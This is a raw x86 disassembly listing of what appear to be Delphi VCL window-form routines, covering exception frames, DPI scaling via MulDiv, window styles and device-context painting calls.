je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ccdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44ccbc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403040
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ccc3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_44cc84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4137b4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403048
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
sub_44cd04
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4032f4
and [ ebx + 0x2f4 ] 0xdf
sub_44cd3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c348
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_434200
xor edx edx
mov eax ebx
call sub_434224
mov edx 0x140
mov eax ebx
call sub_43424c
mov edx 0xf0
mov eax ebx
call sub_434270
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b44
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44d658
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43366c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403040
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_44d9bc
xor edx edx
mov eax ebx
call sub_434c54
xor edx edx
mov eax ebx
call sub_434bbc
mov dl 0x1
mov eax ebx
call sub_43b3d0
mov edx ebx
mov eax [ rw-data ]
call sub_452020
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_44ceb5
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419f7c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413b90
xor edx edx
mov eax ebx
call sub_4169f8
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_450ec8
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44cf20
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40346c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_44cfea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44f844
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_452058
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cc80
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c3c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cff1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44d004
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_44d045
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44d9bc
sub_44d04a
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4032f4
test al al
jne r-xdata
call sub_4038e8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403894
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44d9bc
sub_44d080
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_403580#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44d0e0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_436b64
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44f388
sub_44d11c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_433f60
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413898
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44e780
mov edx esi
mov eax ebp
call sub_413b90
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44e758
mov edx esi
mov eax edi
call sub_44e780
jmp r-xdata
xor edx edx
mov eax edi
call sub_44e734
sub_44d228
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437b28
xor edx edx
push ebp
push sub_44d47e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_437284
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4344ac
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4344f0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44d5b0
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_435c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d485
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44c888
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43ad54
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c888
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ad54
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41cf08
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41cf10
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44d48d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4385d0
push 0x0
push 0x0
push ebx
push sub_44d594
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44d560
push ebx
push sub_44d578
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44d53f
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4170f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_434bbc
sub_44d5cb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44c888
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ad54
mov eax ebx
call sub_44d6b4
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41cfac
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41cfc8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4344d8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_434494
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_44d95c
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_44d98c
sub_44d658
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44f9b8
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop ebx
retn
sub_44d6ec
push ebx
mov ebx eax
mov eax ebx
call sub_44e608
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_44d780
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b290
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43b358
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_44d808
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43b834
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a300
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a2d4
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4032f4
test al al
jne r-xdata
sub_44d874
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403040
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44d8a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebp
call sub_437fc0
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a300
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43b87c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a2d4
mov si 0xfff1
call sub_4032f4
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a310
jmp r-xdata
sub_44d934
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_434c78
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435c5c
sub_44d95c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4344ac
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44d98c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4344f0
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44d9bc
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_4349b0
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_44eaf4
pop esi
pop ebx
retn
sub_44da00
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_44da59
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44da60
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
sub_44da68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_434964
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4387e8
mov eax ebx
call sub_438984
sub_44daa0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a14c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_44dae0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438ca4
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4032f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4032f4
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_435c5c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_447a48
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e40c
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dd59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44dd3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dc3c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dadc
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_448f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd43
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dc3c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_447a48
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e40c
call sub_43b290
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44de87
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44de60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44de43
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41dc3c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dadc
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44de4a
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dc3c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43b290
mov esi eax
sub_44de67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ReleaseDC
retn
sub_44df18
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
